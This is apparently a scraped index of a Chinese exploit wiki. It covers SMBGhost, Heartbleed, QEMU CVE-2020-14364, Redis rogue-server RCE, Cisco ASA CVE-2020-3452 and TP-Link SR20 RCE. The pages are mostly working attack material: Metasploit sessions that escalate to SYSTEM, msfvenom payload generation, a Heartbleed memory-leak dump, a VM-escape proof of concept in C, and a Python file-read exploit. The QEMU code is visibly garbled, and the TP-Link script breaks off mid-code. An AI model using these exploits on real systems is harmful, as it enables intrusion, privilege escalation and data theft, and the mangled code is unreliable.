memmove(*(alloc_buffer+0x18)，SMB_payload，offset) 此时alloc_buffer+0x18已经指向验证程序的tokenAddr内核地址，而SMB_payload此时指向evilData中的权限数据，offset则为0x10。因此，这个内存移动完成后，权限数据将写入tokenAddr处。这意味着，SMS Server成功修改了验证程序的权限，从而实现了验证程序的提权！ 还有一个细节需要注意，在解压时，Srv2DecompressData函数会判断实际的解压后数据大小FinalUnCompressedSize是否和数据包中原始数据大小OriginalCompressedSegmentSize一致 按理来说实际解压后的数据大小为0x1100，不等于数据包中的原始压缩数据大小0xffffffff，这里应该进入到后面内存释放的流程。然而，实际上在函数SmbCompressionDecompress中，调用RtlDecompressBufferEx2成功后会直接将OriginalCompressedSegmentSize赋值给FinalUnCompressedSize。这也是该漏洞关于任意地址写入成功的关键之一。 CVE-2020-0796 目标探测(奇安信) 使用奇安信的漏洞扫描来探测 奇安信 CVE-2020-0796 扫描下载 CVE-2020-0796 蓝屏EXP Github CVE-2020-0796 蓝屏EXP 下载 运行脚本后目标成功蓝屏 CVE-2020-0796 本地提权EXP Github CVE-2020-0796 本地提权EXP 下载 运行应用程序后弹出cmd窗口为 system权限 或者使用 MSF的内置EXP windows/local/cve_2020_0796_smbghost 来本地提权 msf6 exploit(multi/handler) > set lhost 192.168.142.19 lhost => 192.168.142.19 msf6 exploit(multi/handler) > exploit [*] Started reverse TCP handler on 192.168.142.19:4444 [*] Sending stage (200262 bytes) to 192.168.142.61 [*] Meterpreter session 2 opened (192.168.142.19:4444 -> 192.168.142.61:51757) at 2020-11-08 15:28:20 +0800 meterpreter > meterpreter > getuid Server username: DESKTOP-RL1VAD8\\wy meterpreter > background msf6 exploit(multi/handler) > search cve_2020 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/admin/sap/cve_2020_6287_ws_add_user 2020-07-14 normal Yes SAP Unauthenticated WebService User Creation 1 exploit/linux/misc/cve_2020_13160_anydesk 2020-06-16 normal Yes AnyDesk GUI Format String Write 2 exploit/windows/local/cve_2020_0668_service_tracing 2020-02-11 excellent No Service Tracing Privilege Elevation Vulnerability 3 exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move 2020-03-10 excellent Yes Background Intelligent Transfer Service Arbitrary File Move Privilege Elevation Vulnerability 4 exploit/windows/local/cve_2020_0796_smbghost 2020-03-13 good Yes SMBv3 Compression Buffer Overflow Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/local/cve_2020_0796_smbghost msf6 exploit(multi/handler) > use 4 [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp msf6 exploit(windows/local/cve_2020_0796_smbghost) > show options Module options (exploit/windows/local/cve_2020_0796_smbghost): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION yes The session to run this module on. Payload options (windows/x64/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: '', seh, thread, process, none) LHOST 192.168.142.19 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Windows 10 v1903-1909 x64 msf6 exploit(windows/local/cve_2020_0796_smbghost) > set session 2 session => 2 msf6 exploit(windows/local/cve_2020_0796_smbghost) > check [*] The target appears to be vulnerable. msf6 exploit(windows/local/cve_2020_0796_smbghost) > exploit [*] Started reverse TCP handler on 192.168.142.19:4444 [*] Executing automatic check (disable AutoCheck to override) [+] The target appears to be vulnerable. [*] Launching notepad to host the exploit... [+] Process 908 launched. [*] Reflectively injecting the exploit DLL into 908... [*] Injecting exploit into 908... [*] Exploit injected. Injecting payload into 908... [*] Payload injected. Executing exploit... [+] Exploit finished, wait for (hopefully privileged) payload execution to complete. [*] Sending stage (200262 bytes) to 192.168.142.61 meterpreter > getuid Server username: NT AUTHORITY\\SYSTEM CVE-2020-0796 RCE EXP Github CVE-2020-0796 RCE EXP msfvenom生成reversed shellcode msfvenom -p windows/x64/meterpreter/bind_tcp lport=2333 -f py -o exp.py 将生成exp.py中的shellcode替换exploit.py中的shellcode [!NOTE] buf 要替换为 USER_PAYLOAD 使用 MSF msf5 > use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp payload => windows/x64/meterpreter/bind_tcp msf5 exploit(multi/handler) > set lport 2333 lport => 2333 msf5 exploit(multi/handler) > set rhost 192.168.1.110 rhost => 192.168.1.110 msf5 exploit(multi/handler) > exploit 执行脚本即可 python3 exploit.py -ip 192.168.1.110 [!NOTE] 注意有蓝屏概率 参考文章 Windows SMB Ghost（CVE-2020-0796）漏洞分析 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/服务器应用漏洞/":{"url":"PeiQi_Wiki/服务器应用漏洞/","title":"服务器应用漏洞","keywords":"","body":"服务器应用漏洞 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/服务器应用漏洞/OpenSSL/":{"url":"PeiQi_Wiki/服务器应用漏洞/OpenSSL/","title":"Open SSL","keywords":"","body":"OpenSSL OpenSSL 心脏滴血漏洞 CVE-2014-0160 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/服务器应用漏洞/OpenSSL/OpenSSL 心脏滴血漏洞 CVE-2014-0160.html":{"url":"PeiQi_Wiki/服务器应用漏洞/OpenSSL/OpenSSL 心脏滴血漏洞 CVE-2014-0160.html","title":"OpenSSL 心脏滴血漏洞 CVE-2014-0160","keywords":"","body":"OpenSSL 心脏滴血漏洞 CVE-2014-0160 漏洞描述 2014年4月7日，OpenSSL发布安全公告，在OpenSSL1.0.1版本至OpenSSL1.0.1f Beta1版本中存在漏洞，该漏洞中文名称为心脏滴血，英文名称为HeartBleed。其中Heart是指该漏洞位于心跳协议上，Bleed是因为该漏洞会造成数据泄露。即HeartBleed是在心跳协议上的一个数据泄露漏洞，OpenSSL库中用到了该心跳协议。HeartBleed主要存在与OpenSSL的1.0.1版本到1.0.1f版本。 影响版本 [!NOTE] OpenSSL1.0.1、1.0.1a、1.0.1b、1.0.1c、1.0.1d、1.0.1e、1.0.1f、Beta 1 of OpenSSL 1.0.2等版本 环境搭建 https://github.com/vulhub/vulhub.git cd vulhub/openssl/heartbleed docker-compose up -d 漏洞复现 使用Nmap检测脚本对目标进行检测 检测到心脏滴血漏洞，使用MSF对目标进行攻击 msf5 > use auxiliary/scanner/ssl/openssl_heartbleed msf5 auxiliary(scanner/ssl/openssl_heartbleed) > show options Module options (auxiliary/scanner/ssl/openssl_heartbleed): Name Current Setting Required Description ---- --------------- -------- ----------- DUMPFILTER no Pattern to filter leaked memory before storing LEAK_COUNT 1 yes Number of times to leak memory per SCAN or DUMP invocation MAX_KEYTRIES 50 yes Max tries to dump key RESPONSE_TIMEOUT 10 yes Number of seconds to wait for a server response RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:' RPORT 443 yes The target port (TCP) STATUS_EVERY 5 yes How many retries until key dump status THREADS 1 yes The number of concurrent threads (max one per host) TLS_CALLBACK None yes Protocol to use, \"None\" to use raw TLS sockets (Accepted: None, SMTP, IMAP, JABBER, POP3, FTP, POSTGRES) TLS_VERSION 1.0 yes TLS/SSL version to use (Accepted: SSLv3, 1.0, 1.1, 1.2) Auxiliary action: Name Description ---- ----------- SCAN Check hosts for vulnerability msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set rhost 192.168.51.133 rhost => 192.168.51.133 msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set verbose true verbose => true msf5 auxiliary(scanner/ssl/openssl_heartbleed) > run [*] 192.168.51.133:443 - Leaking heartbeat response #1 [*] 192.168.51.133:443 - Sending Client Hello... [*] 192.168.51.133:443 - SSL record #1: [*] 192.168.51.133:443 - Type: 22 [*] 192.168.51.133:443 - Version: 0x0301 [*] 192.168.51.133:443 - Length: 86 [*] 192.168.51.133:443 - Handshake #1: [*] 192.168.51.133:443 - Length: 82 [*] 192.168.51.133:443 - Type: Server Hello (2) [*] 192.168.51.133:443 - Server Hello Version: 0x0301 [*] 192.168.51.133:443 - Server Hello random data: 5fd46996727a4e50c0e2eaecf52d1592384aaa6870d4d65eea8b6b34eb47a389 [*] 192.168.51.133:443 - Server Hello Session ID length: 32 [*] 192.168.51.133:443 - Server Hello Session ID: 66e9cacbefcb28955de31c38bd9dff93de153a6d6247fa117ebc3f2f091d6f74 [*] 192.168.51.133:443 - SSL record #2: [*] 192.168.51.133:443 - Type: 22 [*] 192.168.51.133:443 - Version: 0x0301 [*] 192.168.51.133:443 - Length: 822 [*] 192.168.51.133:443 - Handshake #1: [*] 192.168.51.133:443 - Length: 818 [*] 192.168.51.133:443 - Type: Certificate Data (11) [*] 192.168.51.133:443 - Certificates length: 815 [*] 192.168.51.133:443 - Data length: 818 [*] 192.168.51.133:443 - Certificate #1: [*] 192.168.51.133:443 - Certificate #1: Length: 812 [*] 192.168.51.133:443 - Certificate #1: #, issuer=#, serial=#, not_before=2020-08-09 17:03:46 UTC, not_after=2021-08-09 17:03:46 UTC> [*] 192.168.51.133:443 - SSL record #3: [*] 192.168.51.133:443 - Type: 22 [*] 192.168.51.133:443 - Version: 0x0301 [*] 192.168.51.133:443 - Length: 331 [*] 192.168.51.133:443 - Handshake #1: [*] 192.168.51.133:443 - Length: 327 [*] 192.168.51.133:443 - Type: Server Key Exchange (12) [*] 192.168.51.133:443 - SSL record #4: [*] 192.168.51.133:443 - Type: 22 [*] 192.168.51.133:443 - Version: 0x0301 [*] 192.168.51.133:443 - Length: 4 [*] 192.168.51.133:443 - Handshake #1: [*] 192.168.51.133:443 - Length: 0 [*] 192.168.51.133:443 - Type: Server Hello Done (14) [*] 192.168.51.133:443 - Sending Heartbeat... [*] 192.168.51.133:443 - Heartbeat response, 65535 bytes [+] 192.168.51.133:443 - Heartbeat response with leak, 65535 bytes [*] 192.168.51.133:443 - Printable info leaked: ......_...DV.\\....G...{.vc..i ..Gv.'....f.....\".!.9.8.........5.............................3.2.....E.D...../...A.......................................w.....#.'.g.@.r.v.........8.........2.....E.D.......Q.......P.=...ServiceInstanceW&V.b...?....|.y..................................................................................................................................... repeated 15479 times .....................................................................................................................................@..................................................................................................................................... repeated 16122 times .....................................................................................................................................@.................................................................................................................................................................................................................................................................................................................................QA......h.......h.........7.RV....7.RV..................................................................................................................................... repeated 4129 times .....................................................................................................................................0......X.......X.........................7.RV..............................RV..=.c.RV.. .7.RV..x.7.RV....7.RV....7.RV..x.7.RV..x.7.RV..h.7.RV....7.RV....7.RV..192.168.51.146 - - [12/Dec/2020:06:47:40 +0000] \"POST /sdk HTTP/1.1\" 404 170 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\".org/book/nse.html)\"..................................................................................................................................... repeated 3184 times .....................................................................................................................................Q ........................7.RV....7.RV..................................................................................................................................... repeated 7539 times .....................................................................................................................................@..........................................................................................................................................................................................................................................................................................................................................@.......................................................................................................................................................................................................$4.RV..................................@....... .......0.8.RV..........`.......0........$4.RV..jfx...&...~.RV..........PA......`....... '..RV..@d4.RV....................2.RV....................2.RV..........................1.................8.RV..........................1...............................................!...............h....... ...............m..U`.W.....O.>c.....E^X4........kr[..:.1...z[..x.W].........f...3h.qS.&K.(A*q*...].tx.b....X........Np....l.F...5....~..Z2.D..$........................................................................................................................................1.......x.......x.......P.2.RV....2.RV..0.......0.......>#NQ[.8.].......&.i2y.x.I....iOk........a....... '..RV..`.2.RV..................0.2.RV....................2.RV......................;P.e.........................U.6.&`.Ks..w>V.. ^..N..z....z...M.+..n/i..C...D......a..2.p.....I5.F......!.3Xhy.4.....r.....h.d..b........).......3.....&......IE...c,8.T.~..H.P.{y.....CK.,!&..;..vw....H.C...q....%e..{.XT.jq.R.r.....RHw..57.COlB..|......@...*.G(3..-N..P....mLO..]./.,9..|..+2.Lh..q..dF.m...'.....`...S.8........Q...U.0....I................................................................................................................................................................................................................................................................................ '..RV.. .8.RV..`.2.RV....................8.RV.................................. .2.RV....................2.RV............................................2.RV....................2.RV.......................... .2.RV.. .2.RV..................h.......h.........8.RV....8.RV..................................................................................................................................... repeated 745 times .....................................................................................................................................#8.RV..`.2.RV........!.3Xhy.4.....r.....h.d..b........).......3.....&......IE...c,8.T.~..H.P.{y.....CK.,!&..;..vw....H.C...q....%e..{.XT.jq.R.r.....RHw..57.COlB..|......@...*.G(3..-N..P....mLO..]./.,9..|..+2.Lh..q..dF.m...'.....`...S.8........Q...U.0....I ..................................................................................................................................... repeated 277 times .....................................................................................................................................X.......`.2.RV..........................................................P...........RV............................................................................................................................................................................................................................................................................................................................................2.RV..X..................................................................................................................................... repeated 437 times .....................................................................................................................................A.......X.........1.RV..................................................................................................................................................................................................................................................................................................................................X.......X..................................................................................................................................... repeated 429 times .....................................................................................................................................x.......!.......X.......X..................................................................................................................................... repeated 1942 times .....................................................................................................................................@..........V...R.._.i.rzNP.....-..8J.hp..^..k4.G.. f.....(.]..8......:mbG..~.?/..ot...................6...2../..,0..(0...........j..0...*.H........0V1.0...U....US1.0...U....Denial1.0...U....Springfield1.0...U....Dis1.0...U....localhost0...200809170346Z..210809170346Z0V1.0...U....US1.0...U....Denial1.0...U....Springfield1.0...U....Dis1.0...U....localhost0..\"0...*.H.............0.........8...;....../t.....^.....P..=....w.*b.a>.8.Q.?.$.c.......{G. ........l..i...D..V....0......B..J..Y.c.wO.....M.Df..R....\".4.u...............P.>.c..|.s(......,..H.1..0.=l`...(2..Sb.......`...c....5J....v..uj.*^i.$6^..a3.s.......v...\\....M.pK.9....t.&...|y...u1.......u..M..%.+..{e....G..~.v.D.6...............=).3{......r/.\"vz..a.U..5-.5.=......l..ud......Nx...n..$h...4.G.~b.LU.Y...37..e....%.w.......K...G...A....~m.h,......qz>}uA.^)..A.&}o@..'...y.]..V..S..JY........Y/.u|....$.n.T._.b\\\\c...o.]....L.h...v*....z..D..?Kq9hJ.kT....?.....=......su....p.S...j.e.....-N}.S...x..Z.....t.;Z...n=.1.......J.1n.l...w. .l.d.W. .........8..`.>O........t...r..~.A$..R...v.8......x.\\o PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/服务器应用漏洞/Qemu/":{"url":"PeiQi_Wiki/服务器应用漏洞/Qemu/","title":"Qemu","keywords":"","body":"QEMU QEMU 虚拟机逃逸漏洞 CVE-2020-14364 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/服务器应用漏洞/Qemu/QEMU 虚拟机逃逸漏洞 CVE-2020-14364.html":{"url":"PeiQi_Wiki/服务器应用漏洞/Qemu/QEMU 虚拟机逃逸漏洞 CVE-2020-14364.html","title":"QEMU 虚拟机逃逸漏洞 CVE-2020-14364","keywords":"","body":"QEMU 虚拟机逃逸漏洞 CVE-2020-14364 漏洞描述 当地时间8月24日，一个存在于QEMU USB模拟器中的越界读写漏洞（CVE-2020-14364）被公布。 漏洞位于 ./hw/usb/core.c 中，当程序处理来自客户机的USB数据包时，如果在 do_token_in 与 do_token_out中’USBDevice->setup_len’超过了USBDevice->data_buf[4096]，则存在问题。 客户机用户可能会使用此漏洞使QEMU进程崩溃，从而导致DoS或在宿主机上以QEMU进程的特权执行任意代码，实现虚拟机逃逸。 攻击者在拥有云环境虚拟机操作系统权限的情况下，便可利用该漏洞获取宿主机权限，进而攻击虚拟机所在资源池所有租户主机，甚至可通过已开通的内网权限攻击管理域系统，风险极高。 本次漏洞的影响范围较广，涉及qemu 1.0 以上的全部版本。 漏洞影响 [!NOTE] Qemu > 1.0 漏洞复现 漏洞原理 USB总线通过创建一个USBpacket对象来和USB设备通信。 Usbpacket对象中包含以下关键内容 其中pid表明packet的类型，存在三种类型in、out、setup, ep指向endpoint对象，通过此结构定位目标usb设备。 数据交换为usbdevice中缓冲区的data_buf与usbpacket对象中使用usb_packet_map申请的缓冲区两者间通过usb_packet_copy函数实现,为了防止两者缓冲区长度不匹配，传送的长度由s->setup_len限制。 漏洞存在于s->setup_len赋值的过程do_token_setup中。 虽然进行了校验，但是由于在校验前，s->setup_len的值已经被设置导致之后的do_token_in或者do_token_out中使用usb_packet_copy时会产生越界读写漏洞。 利用方式 1. 泄露USBdevice对象的地址。 观察越界可读内容发现 可以从下方的ep_ctl->dev获取到usbdevice的对象地址。 2. 通过usbdevice的对象地址我们可以得到s->data_buf的位置，之后只需要覆盖下方的setup_index为目标地址-(s->data_buf)即可实现任意地址写。 3. 我们还需要获取任何地址读取功能，setup_buf [0]控制写入方向，并且只能由do_token_setup进行修改。 由于我们在第二步中使用了越界写入功能，因此setup_buf [0]是写入方向，因此只可以进行写入操作，无法读取。绕过方法：设置setup_index = 0xfffffff8，再次越界，修改setup_buf [0]的值，然后再次将setup_index修改为要读取的地址，以实现任意地址读取。 4.通过任意地址读取usbdevice对象的内容以获取ehcistate对象地址，再次使用任意地址读取ehcistate对象的内容以获取ehci_bus_ops_companion地址。 该地址位于程序data节区。 这时，我们可以获得程序的加载地址和system @ plt地址。也可以通过读取usbdevice固定偏移位置后的usb-tablet对象来获得加载地址。 5.在data_buf中伪造irq结构。 6.以伪造结构劫持ehcistate中的irq对象。 7.通过mmio读取寄存器以触发ehci_update_irq，执行system（“ xcalc”）。 完成利用 QEMU CVE-2020-14364 POC 视频演示 漏洞利用POC #include #include #include #include #include #include #include #include #include #include #include #include #include #include #include #include #include #include unsigned char* mmio_mem; char *dmabuf; struct ohci_hcca * hcca; struct EHCIqtd * qtd; struct ohci_ed * ed; struct ohci_td * td; char *setup_buf; uint32_t *dmabuf32; char *td_addr; struct EHCIqh * qh; struct ohci_td * td_1; char *dmabuf_phys_addr; typedef struct USBDevice USBDevice; typedef struct USBEndpoint USBEndpoint; struct USBEndpoint { uint8_t nr; uint8_t pid; uint8_t type; uint8_t ifnum; int max_packet_size; int max_streams; bool pipeline; bool halted; USBDevice *dev; USBEndpoint *fd; USBEndpoint *bk; }; struct USBDevice { int32_t remote_wakeup; int32_t setup_state; int32_t setup_len; int32_t setup_index; USBEndpoint ep_ctl; USBEndpoint ep_in[15]; USBEndpoint ep_out[15]; }; typedef struct EHCIqh { uint32_t next; /* Standard next link pointer */ /* endpoint characteristics */ uint32_t epchar; /* endpoint capabilities */ uint32_t epcap; uint32_t current_qtd; /* Standard next link pointer */ uint32_t next_qtd; /* Standard next link pointer */ uint32_t altnext_qtd; uint32_t token; /* Same as QTD token */ uint32_t bufptr[5]; /* Standard buffer pointer */ } EHCIqh; typedef struct EHCIqtd { uint32_t next; /* Standard next link pointer */ uint32_t altnext; /* Standard next link pointer */ uint32_t token; uint32_t bufptr[5]; /* Standard buffer pointer */ } EHCIqtd; uint64_t virt2phys(void* p) { uint64_t virt = (uint64_t)p; // Assert page alignment int fd = open(\"/proc/self/pagemap\", O_RDONLY); if (fd == -1) die(\"open\"); uint64_t offset = (virt / 0x1000) * 8; lseek(fd, offset, SEEK_SET); uint64_t phys; if (read(fd, &phys, 8 ) != 8) die(\"read\"); // Assert page present phys = (phys & ((1ULL epchar=0x00; qh->token=1current_qtd=virt2phys(dmabuf+0x200); struct EHCIqtd * qtd; qtd=dmabuf+0x200; qtd->token=1bufptr[0]=virt2phys(dmabuf+0x300); setup_buf[6]=0xff; setup_buf[7]=0x0; dmabuf32[0]=virt2phys(dmabuf+0x100)+0x2; mmio_write(0x28,0x0); mmio_write(0x30,0x0); mmio_write(0x38,virt2phys(dmabuf)); mmio_write(0x34,virt2phys(dmabuf)); mmio_write(0x20,0x11); } void set_length(uint16_t len,uint8_t in){ mmio_write(0x64,0x100); mmio_write(0x64,0x4); setup_buf[0]=in; setup_buf[6]=len&0xff; setup_buf[7]=(len>>8)&0xff; qh->epchar=0x00; qh->token=1current_qtd=virt2phys(dmabuf+0x200); qtd->token=1bufptr[0]=virt2phys(dmabuf+0x300); dmabuf32[0]=virt2phys(dmabuf+0x100)+0x2; mmio_write(0x28,0x0); mmio_write(0x30,0x0); mmio_write(0x38,virt2phys(dmabuf)); mmio_write(0x34,virt2phys(dmabuf)); mmio_write(0x20,0x11); } void do_copy_read(){ mmio_write(0x64,0x100); mmio_write(0x64,0x4); qh->epchar=0x00; qh->token=1current_qtd=virt2phys(dmabuf+0x200); qtd->token=1bufptr[0]=virt2phys(dmabuf+0x1000); qtd->bufptr[1]=virt2phys(dmabuf+0x2000); dmabuf32[0]=virt2phys(dmabuf+0x100)+0x2; mmio_write(0x28,0x0); mmio_write(0x30,0x0); mmio_write(0x38,virt2phys(dmabuf)); mmio_write(0x34,virt2phys(dmabuf)); mmio_write(0x20,0x11); } int main() { init(); iopl(3); outw(0,0xc0c0); outw(0,0xc0e0); outw(0,0xc010); outw(0,0xc0a0); sleep(3); init_state(); sleep(2); set_length(0x2000,0x80); sleep(2); do_copy_read(); sleep(2); struct USBDevice* usb_device_tmp=dmabuf+0x2004; struct USBDevice usb_device; memcpy(&usb_device,usb_device_tmp,sizeof(USBDevice)); uint64_t dev_addr=usb_device.ep_ctl.dev; uint64_t *tmp=dmabuf+0x24f4; long long base=*tmp; if(base == 0){ printf(\"INIT DOWN,DO IT AGAIN\"); return 0; } base-=0xee5480-0x2668c0; uint64_t system=base+0x2d9610; puts(\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"); printf(\"LEAK BASE ADDRESS:%llx!\\n\",base); printf(\"LEAK SYSTEM ADDRESS:%llx!\\n\",system); puts(\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"); } PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/服务器应用漏洞/Redis/":{"url":"PeiQi_Wiki/服务器应用漏洞/Redis/","title":"Redis","keywords":"","body":"Redis Redis PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/服务器应用漏洞/Redis/Redis 小于5.0.5 主从复制 RCE .html":{"url":"PeiQi_Wiki/服务器应用漏洞/Redis/Redis 小于5.0.5 主从复制 RCE .html","title":"Redis 小于5.0.5 主从复制 RCE ","keywords":"","body":"Redis 漏洞描述 在2019年7月7日结束的WCTF2019 Final上，LC/BC的成员Pavel Toporkov在分享会上介绍了一种关于redis新版本的RCE利用方式，比起以前的利用方式来说，这种利用方式更为通用，危害也更大 Pavel Toporkov的分享 影响版本 [!NOTE] Redis 环境搭建 docker pull damonevking/redis5.0 docker run -p 6379:6379 -d damonevking/redis5.0 redis-server nmap扫描一下6379端口开放即为搭建成功 root@kali:~/桌面# docker pull damonevking/redis5.0 Using default tag: latest latest: Pulling from damonevking/redis5.0 fc7181108d40: Pull complete 3e0ac67cad82: Pull complete 6ee495cb7235: Pull complete 9f7206d08b9d: Pull complete a8354ef8cccb: Pull complete 53afb10d81c2: Pull complete Digest: sha256:adcf62f378efe1187d2f72c6f0ecdf86ab2173a9e1c3c9f4fe4bb89060f5362f Status: Downloaded newer image for damonevking/redis5.0:latest docker.io/damonevking/redis5.0:latest root@kali:~/桌面# docker run -p 6379:6379 -d damonevking/redis5.0 redis-server 1275aa9c6c8f8ad0b6c8e58e609be6681acedec301b5593f7e8b0bd65f7fad12 root@kali:~/桌面# nmap 127.0.0.1 -p 6379 Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-08 21:47 CST Nmap scan report for localhost (127.0.0.1) Host is up (0.000099s latency). PORT STATE SERVICE 6379/tcp open redis Nmap done: 1 IP address (1 host up) scanned in 0.10 seconds 漏洞复现 关于漏洞原理请查看Pavel Toporkov的分享 漏洞利用脚本: n0b0dyCN/redis-rogue-server ➜ ./redis-rogue-server.py -h ______ _ _ ______ _____ | ___ \\ | (_) | ___ \\ / ___| | |_/ /___ __| |_ ___ | |_/ /___ __ _ _ _ ___ \\ `--. ___ _ ____ _____ _ __ | // _ \\/ _` | / __| | // _ \\ / _` | | | |/ _ \\ `--. \\/ _ \\ '__\\ \\ / / _ \\ '__| | |\\ \\ __/ (_| | \\__ \\ | |\\ \\ (_) | (_| | |_| | __/ /\\__/ / __/ | \\ V / __/ | \\_| \\_\\___|\\__,_|_|___/ \\_| \\_\\___/ \\__, |\\__,_|\\___| \\____/ \\___|_| \\_/ \\___|_| __/ | |___/ @copyright n0b0dy @ r3kapig Usage: redis-rogue-server.py [options] Options: -h, --help show this help message and exit --rhost=REMOTE_HOST target host --rport=REMOTE_PORT target redis port, default 6379 --lhost=LOCAL_HOST rogue server ip --lport=LOCAL_PORT rogue server listen port, default 21000 --exp=EXP_FILE Redis Module to load, default exp.so -v, --verbose Show full data stream Example python3 redis-rogue-server.py --rhost 192.168.51.146 --lhost 192.168.51.146 --exp=exp.so PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/语言框架漏洞/":{"url":"PeiQi_Wiki/语言框架漏洞/","title":"语言框架漏洞","keywords":"","body":"语言框架漏洞🐭 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/路由器漏洞/":{"url":"PeiQi_Wiki/路由器漏洞/","title":"路由器漏洞","keywords":"","body":"路由器漏洞🦊 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/路由器漏洞/Cisco/":{"url":"PeiQi_Wiki/路由器漏洞/Cisco/","title":"Cisco","keywords":"","body":"Cisco CISCO ASA设备任意文件读取漏洞 CVE-2020-3452 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/路由器漏洞/Cisco/CISCO ASA设备任意文件读取漏洞 CVE-2020-3452.html":{"url":"PeiQi_Wiki/路由器漏洞/Cisco/CISCO ASA设备任意文件读取漏洞 CVE-2020-3452.html","title":"CISCO ASA设备任意文件读取漏洞 CVE-2020-3452","keywords":"","body":"CISCO ASA设备任意文件读取漏洞 CVE-2020-3452 漏洞描述 Cisco Adaptive Security Appliance (ASA) 防火墙设备以及Cisco Firepower Threat Defense (FTD)设备的WEB管理界面存在未授权的目录穿越漏洞和远程任意文件读取漏洞，允许未经身份验证的远程攻击者进行目录遍历攻击并读取目标系统上的敏感文件，此漏洞不能用于获取对ASA或FTD系统文件或底层操作系统(OS)文件的访问，所以只能读取web系统目录的文件，比如webvpn的配置文件、书签、网络cookies、部分网络内容和超文本传输协议网址等信息。 影响版本 Cisco ASA设备 Cisco FTD设备 FOFA [!NOTE] /+CSCOE+/ Cisco-ASA 漏洞复现 FOFA语句查找 POC如下 https://xxx.xxx.xxx.xxx/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../ 会下载得到一个文件 漏洞利用POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import base64 import sys import urllib3 def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Cisco \\033[0m') print('+ \\033[36m使用格式: python3 CVE-2020-1956 \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vnln_url = target_url + \"/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36\" } urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) response = requests.get(url=vnln_url, headers=headers, verify=False ,timeout=20) if \"Bad Request\" in response.text: print(\"\\033[31m[x] 漏洞已修复 \\033[0m\") else: print(\"\\033[32m[o] 存在漏洞，响应为\\n\\033[0m\",response.text) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/路由器漏洞/TP-Link/":{"url":"PeiQi_Wiki/路由器漏洞/TP-Link/","title":"TP Link","keywords":"","body":"TP-Link TP-Link SR20 远程命令执行 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/路由器漏洞/TP-Link/TP-Link SR20 远程命令执行.html":{"url":"PeiQi_Wiki/路由器漏洞/TP-Link/TP-Link SR20 远程命令执行.html","title":"TP-Link SR20 远程命令执行","keywords":"","body":"TP-Link SR20 远程命令执行 漏洞描述 据外媒报道，著名安全专家、Google 安全工程师Matthew Garrett公开了TP-LINK SR20智能家居路由器一个“允许来自本地网络连接的任意命令执行”的漏洞。攻击者可通过该漏洞控制用户路由器，借此执行任意命令，危及用户隐私安全。 漏洞影响 [!NOTE] TP-Link SR20 漏洞利用POC #!/usr/bin/python3 # Create /testfile in your tftp root directory with the followingcontents: #function config_test(config) # os.execute(\"telnetd -l/bin/login.sh\") #end # Replace 192.168.0.1 with the IP address of the vulnerable device importbinascii importsocket port_send = 1040 port_receive = 61000 tddp_ver = \"01\" tddp_command = \"31\" tddp_req = \"01\" tddp_reply = \"00\" tddp_padding = \"%0.16X\"% 00 tddp_packet = \"\".join([tddp_ver, tddp_command, tddp_req,tddp_reply, tddp_padding]) sock_receive = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) sock_receive.bind(( '', port_receive)) # 